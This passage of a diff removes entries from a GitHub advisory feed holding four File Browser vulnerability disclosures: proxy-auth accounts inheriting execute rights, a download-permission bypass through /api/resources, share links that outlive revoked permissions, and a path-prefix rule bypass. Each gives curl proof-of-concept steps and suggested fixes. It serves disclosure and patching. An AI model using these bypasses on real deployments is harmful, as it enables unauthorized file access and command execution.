-<p>The fix in commit <code>b6a4fb1</code> ("self-registered users don't get execute perms") stripped <code>Execute</code> permission and <code>Commands</code> from users created via the signup handler. The same fix was not applied to the proxy auth handler. Users auto-created on first successful proxy-auth login are granted execution capabilities from global defaults, even though the signup path was explicitly changed to prevent execution rights from being inherited by automatically provisioned accounts.</p>
-<p>Confirmed on v2.62.2 (commit 860c19d).</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>auth/proxy.go</code> <code>createUser()</code> applies defaults without restriction:</p>
-<pre><code>user := &amp;users.User{
-    Username:     username,
-    Password:     hashedRandomPassword,
-    LockPassword: true,
-}
-setting.Defaults.Apply(user)
-// No restriction on Execute, Commands, or Admin
-</code></pre>
-<p>Compare with <code>http/auth.go</code> signup handler (lines 170-178):</p>
-<pre><code>d.settings.Defaults.Apply(user)
-user.Perm.Admin = false
-// Self-registered users should not inherit execution capabilities
-// from default settings, regardless of what the administrator has
-// configured as the default.
-user.Perm.Execute = false
-user.Commands = []string{}
-</code></pre>
-<p>The commit message for <code>b6a4fb1</code> states: "Execution rights must be explicitly granted by an admin." Users auto-created via proxy auth are also automatically provisioned (created on first login without explicit admin action), and the admin has not explicitly granted them execution rights.</p>
-<h2 id="poc">PoC</h2>
-<p>Tested on filebrowser v2.62.2, built from HEAD.</p>
-<pre><code># Configure with proxy auth, default commands, and exec
-filebrowser config set --auth.method=proxy --auth.header=X-Remote-User \
-  --commands "git,ls,cat,id"
-
-# Login as admin and verify defaults have execute=true, commands set
-ADMIN_TOKEN=$(curl -s http://HOST/api/login -H "X-Remote-User: admin")
-
-# Auto-create new user via proxy header
-PROXY_TOKEN=$(curl -s http://HOST/api/login -H "X-Remote-User: newproxyuser")
-
-# Check permissions
-curl -s http://HOST/api/users -H "X-Auth: $ADMIN_TOKEN" | jq '.[] | select(.username=="newproxyuser") | {execute: .perm.execute, commands}'
-</code></pre>
-<p>Result:</p>
-<pre><code>{
-  "execute": true,
-  "commands": ["git", "ls", "cat", "id"]
-}
-</code></pre>
-<p>The auto-created proxy user inherited Execute and the full Commands list. A user created via signup would have <code>execute: false</code> and <code>commands: []</code>.</p>
-<h2 id="impact">Impact</h2>
-<p>In proxy-auth deployments where the admin has configured default commands, users auto-provisioned on first proxy login receive execution capabilities that were not explicitly granted. The project established a security invariant in commit <code>b6a4fb1</code>: automatically provisioned accounts must not inherit execution rights from defaults. The proxy auto-provisioning path violates that invariant.</p>
-<p>This is an incomplete fix for GHSA-x8jc-jvqm-pm3f ("Signup Grants Execution Permissions When Default Permissions Includes Execution"), which addressed the signup handler but not the proxy auth handler.</p>
-<h2 id="preconditions">Preconditions</h2>
-<ul>
-<li>Proxy auth enabled (<code>--auth.method=proxy</code>)</li>
-<li>Exec not disabled</li>
-<li>Default settings include non-empty Commands (admin-configured)</li>
-</ul>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Apply the same restrictions as the signup handler:</p>
-<pre><code>setting.Defaults.Apply(user)
-user.Perm.Admin = false
-user.Perm.Execute = false
-user.Commands = []string{}
-</code></pre>
-<hr>
-<p><strong>Update:</strong> Fix submitted as PR #5890.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7526-j432-6ppp">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7526-j432-6ppp</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35607">https://nvd.nist.gov/vuln/detail/CVE-2026-35607</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/pull/5890">https://github.com/filebrowser/filebrowser/pull/5890</a></li>
-<li><a href="https://github.com/advisories/GHSA-7526-j432-6ppp">https://github.com/advisories/GHSA-7526-j432-6ppp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7526-j432-6ppp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-08T00:05:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser discloses text file content via /api/resources endpoint bypassing Perm.Download check]]></title>
-        <id>https://github.com/advisories/GHSA-67cg-cpj7-qgc9</id>
-        <link href="https://github.com/advisories/GHSA-67cg-cpj7-qgc9"/>
-        <updated>2026-04-08T00:05:09.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>resourceGetHandler</code> in <code>http/resource.go</code> returns full text file content without checking the <code>Perm.Download</code> permission flag. All three other content-serving endpoints (<code>/api/raw</code>, <code>/api/preview</code>, <code>/api/subtitle</code>) correctly verify this permission before serving content. A user with <code>download: false</code> can read any text file within their scope through two bypass paths.</p>
-<p>Confirmed on v2.62.2 (commit 860c19d).</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>http/resource.go</code> line 26-33 hardcodes <code>Content: true</code> in the FileOptions without checking download permission:</p>
-<pre><code>file, err := files.NewFileInfo(&amp;files.FileOptions{
-    ...
-    Content:    true,  // Always loads text content, no permission check
-})
-</code></pre>
-<p>Lines 44-63: the <code>X-Encoding: true</code> header path reads the entire file and returns raw bytes as <code>application/octet-stream</code>, also without any download check.</p>
-<p>Compare with the three protected endpoints:</p>
-<pre><code>// raw.go:83-85
-if !d.user.Perm.Download { return http.StatusAccepted, nil }
-
-// preview.go:38-40
-if !d.user.Perm.Download { return http.StatusAccepted, nil }
-
-// subtitle.go:13-15
-if !d.user.Perm.Download { return http.StatusAccepted, nil }
-</code></pre>
-<h2 id="poc">PoC</h2>
-<p>Tested on filebrowser v2.62.2, built from HEAD.</p>
-<pre><code># Create user with download=false via CLI
-filebrowser users add restricted testuser123456 --perm.download=false
-
-# Login
-TOKEN=$(curl -s http://HOST/api/login -d '{"username":"restricted","password":"testuser123456"}')
-
-# BLOCKED: /api/raw correctly enforces download permission
-curl -s -w "\nHTTP: %{http_code}" http://HOST/api/raw/secret.txt -H "X-Auth: $TOKEN"
-# → 202 Accepted (empty body)
-
-# BYPASS 1: /api/resources with X-Encoding returns raw file content
-curl -s http://HOST/api/resources/secret.txt -H "X-Auth: $TOKEN" -H "X-Encoding: true"
-# → 200 OK, body: SECRET_PASSWORD=hunter2
-
-# BYPASS 2: /api/resources JSON includes content field
-curl -s http://HOST/api/resources/secret.txt -H "X-Auth: $TOKEN" | jq .content
-# → "SECRET_PASSWORD=hunter2\n"
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>A user with <code>download: false</code> can read the full content of text files within their authorized scope (up to the 10MB <code>detectType</code> limit). This includes source code, configuration files, credentials, and API tokens stored as text.</p>
-<p>This bypass does not defeat path authorization. It bypasses only the <code>Download</code> permission for files the user can otherwise address within their authorized scope. The inconsistency across the four content-serving endpoints (three check <code>Perm.Download</code>, one does not) indicates this is an oversight, not a design decision.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Match the existing endpoint behavior (HTTP 202 for denied downloads):</p>
-<pre><code>Content: d.user.Perm.Download,  // Only load content when permitted
-</code></pre>
-<p>And add a guard before the X-Encoding raw byte path, matching the existing 202 pattern:</p>
-<pre><code>if !d.user.Perm.Download {
-    return http.StatusAccepted, nil
-}
-</code></pre>
-<hr>
-<p><strong>Update:</strong> Fix submitted as PR #5891.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-67cg-cpj7-qgc9">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-67cg-cpj7-qgc9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35606">https://nvd.nist.gov/vuln/detail/CVE-2026-35606</a></li>
-<li><a href="https://github.com/advisories/GHSA-67cg-cpj7-qgc9">https://github.com/advisories/GHSA-67cg-cpj7-qgc9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-67cg-cpj7-qgc9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-08T00:05:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser share links remain accessible after Share/Download permissions are revoked]]></title>
-        <id>https://github.com/advisories/GHSA-v9w4-gm2x-6rvf</id>
-        <link href="https://github.com/advisories/GHSA-v9w4-gm2x-6rvf"/>
-        <updated>2026-04-08T00:04:59.000Z</updated>
-        <content type="html"><![CDATA[<p>When an admin revokes a user's Share and Download permissions, existing share links created by that user remain fully accessible to unauthenticated users. The public share download handler does not re-check the share owner's current permissions. Verified with a running PoC against v2.62.2 (commit 860c19d).</p>
-<h2 id="details">Details</h2>
-<p>Share creation (<code>http/share.go:21-29</code>) correctly checks permissions:</p>
-<pre><code>func withPermShare(fn handleFunc) handleFunc {
-    return withUser(func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
-        if !d.user.Perm.Share || !d.user.Perm.Download {
-            return http.StatusForbidden, nil
-        }
-        return fn(w, r, d)
-    })
-}
-</code></pre>
-<p>But share access (<code>http/public.go:18-87</code>, <code>withHashFile</code>) does not:</p>
-<pre><code>var withHashFile = func(fn handleFunc) handleFunc {
-    return func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
-        link, err := d.store.Share.GetByHash(id)   // line 21: checks share exists
-        authenticateShareRequest(r, link)            // line 26: checks password
-        user, err := d.store.Users.Get(...)          // line 31: checks user exists
-        d.user = user                                // line 36: sets user
-        file, err := files.NewFileInfo(...)           // line 38: gets file
-        // MISSING: no check for d.user.Perm.Share or d.user.Perm.Download
-    }
-}
-</code></pre>
-<h2 id="proof-of-concept-runtime-verified">Proof of Concept (runtime-verified)</h2>
-<pre><code># Step 1: Login as admin
-TOKEN=$(curl -s -X POST http://localhost:18080/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"&lt;admin-password&gt;"}')
-
-# Step 2: Create testuser with Share+Download permissions
-curl -X POST http://localhost:18080/api/users \
-  -H "X-Auth: $TOKEN" -H "Content-Type: application/json" \
-  -d '{"what":"user","which":[],"current_password":"&lt;admin-password&gt;",
-       "data":{"username":"testuser","password":"TestPass123!","scope":".",
-       "perm":{"share":true,"download":true,"create":true}}}'
-
-# Step 3: Login as testuser and create share
-USER_TOKEN=$(curl -s -X POST http://localhost:18080/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"testuser","password":"TestPass123!"}')
-curl -X POST http://localhost:18080/api/share/secret.txt \
-  -H "X-Auth: $USER_TOKEN" -H "Content-Type: application/json" -d '{}'
-# Returns: {"hash":"fB4Qwtsn","path":"/secret.txt","userID":2,"expire":0}
-
-# Step 4: Verify share works (unauthenticated)
-curl http://localhost:18080/api/public/dl/fB4Qwtsn
-# Returns: file content (200 OK)
-
-# Step 5: Admin revokes testuser's Share and Download permissions
-curl -X PUT http://localhost:18080/api/users/2 \
-  -H "X-Auth: $TOKEN" -H "Content-Type: application/json" \
-  -d '{"what":"user","which":["all"],"current_password":"&lt;admin-password&gt;",
-       "data":{"id":2,"username":"testuser","scope":".",
-       "perm":{"share":false,"download":false,"create":true}}}'
-
-# Step 6: Verify testuser CANNOT create new shares
-curl -X POST http://localhost:18080/api/share/secret.txt \
-  -H "X-Auth: $USER_TOKEN" -d '{}'
-# Returns: 403 Forbidden (correct)
-
-# Step 7: THE BUG - old share STILL works
-curl http://localhost:18080/api/public/dl/fB4Qwtsn
-# Returns: file content (200 OK) - SHOULD be 403
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>When an admin revokes a user's Share or Download permissions:</p>
-<ul>
-<li>New share creation is correctly blocked (403)</li>
-<li>But all existing shares created by that user remain fully accessible to unauthenticated users</li>
-<li>The admin has a false sense of security: they believe revoking Share permission stops all sharing</li>
-</ul>
-<p>This is the same vulnerability class as GHSA-68j5-4m99-w9w9 ("Authorization Policy Bypass in Public Share Download Flow").</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Add permission re-validation in <code>withHashFile</code>:</p>
-<pre><code>user, err := d.store.Users.Get(d.server.Root, link.UserID)
-if err != nil {
-    return errToStatus(err), err
-}
-
-// Verify the share owner still has Share and Download permissions
-if !user.Perm.Share || !user.Perm.Download {
-    return http.StatusForbidden, nil
-}
-
-d.user = user
-</code></pre>
-<hr>
-<p><strong>Update:</strong> Fix submitted as PR #5888.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-v9w4-gm2x-6rvf">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-v9w4-gm2x-6rvf</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35604">https://nvd.nist.gov/vuln/detail/CVE-2026-35604</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/pull/5888">https://github.com/filebrowser/filebrowser/pull/5888</a></li>
-<li><a href="https://github.com/advisories/GHSA-v9w4-gm2x-6rvf">https://github.com/advisories/GHSA-v9w4-gm2x-6rvf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v9w4-gm2x-6rvf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-08T00:04:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser has an access rule bypass via HasPrefix without trailing separator in path matching]]></title>
-        <id>https://github.com/advisories/GHSA-5q48-q4fm-g3m6</id>
-        <link href="https://github.com/advisories/GHSA-5q48-q4fm-g3m6"/>
-        <updated>2026-04-08T00:04:50.000Z</updated>
-        <content type="html"><![CDATA[<p>Hi,</p>
-<p>The <code>Matches()</code> function in <code>rules/rules.go</code> uses <code>strings.HasPrefix()</code> without a trailing directory separator when matching paths against access rules. A rule for <code>/uploads</code> also matches <code>/uploads_backup/</code>, granting or denying access to unintended directories. Verified against v2.62.2 (commit 860c19d).</p>
-<h2 id="details">Details</h2>
-<p>At <code>rules/rules.go:29-35</code>:</p>
-<pre><code>func (r *Rule) Matches(path string) bool {
-    if r.Regex {
-        return r.Regexp.MatchString(path)
-    }
-    return strings.HasPrefix(path, r.Path)
-}
-</code></pre>
-<p>When a rule has <code>Path: "/uploads"</code>, any path starting with <code>/uploads</code> matches, including <code>/uploads_backup/secret.txt</code>. The regex variant at line 31 uses proper matching, but the non-regex path uses a prefix check without ensuring the match ends at a directory boundary.</p>
-<p>The <code>Check()</code> function at <code>http/data.go:29-48</code> iterates all rules with last-match-wins semantics. No secondary validation exists beyond this prefix check.</p>
-<h2 id="poc">PoC</h2>
-<p>Admin configures: allow rule <code>Path: "/shared"</code> for a restricted user.</p>
-<p>Filesystem contains:</p>
-<ul>
-<li><code>/shared/</code> (intended to be accessible)</li>
-<li><code>/shared_private/</code> (intended to be restricted)</li>
-</ul>
-<p>User requests <code>/shared_private/secret.txt</code>:</p>
-<ul>
-<li><code>strings.HasPrefix("/shared_private/secret.txt", "/shared")</code> returns true</li>
-<li>Allow rule applies</li>
-<li>Access granted to the unintended directory</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>Authenticated users can access files in sibling directories that share a common prefix with an allowed directory, bypassing the admin's intended access configuration.</p>
-<h2 id="prior-art">Prior art</h2>
-<p>Prior advisories GHSA-4mh3-h929-w968 (path-based access control bypass) and GHSA-9f3r-2vgw-m8xp (path traversal in copy/rename) addressed related access control issues. This HasPrefix prefix-collision is a distinct, unreported variant.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<pre><code>func (r *Rule) Matches(path string) bool {
-    if r.Regex {
-        return r.Regexp.MatchString(path)
-    }
-    prefix := r.Path
-    if prefix != "/" &amp;&amp; !strings.HasSuffix(prefix, "/") {
-        prefix += "/"
-    }
-    return path == r.Path || strings.HasPrefix(path, prefix)
-}
-</code></pre>
-<p>Koda Reef</p>
-<hr>
-<p><strong>Update:</strong> Fix submitted as PR #5889.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-5q48-q4fm-g3m6">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-5q48-q4fm-g3m6</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35605">https://nvd.nist.gov/vuln/detail/CVE-2026-35605</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/pull/5889">https://github.com/filebrowser/filebrowser/pull/5889</a></li>
-<li><a href="https://github.com/advisories/GHSA-5q48-q4fm-g3m6">https://github.com/advisories/GHSA-5q48-q4fm-g3m6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5q48-q4fm-g3m6</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-08T00:04:49.000Z</published>
     </entry>
 </feed>
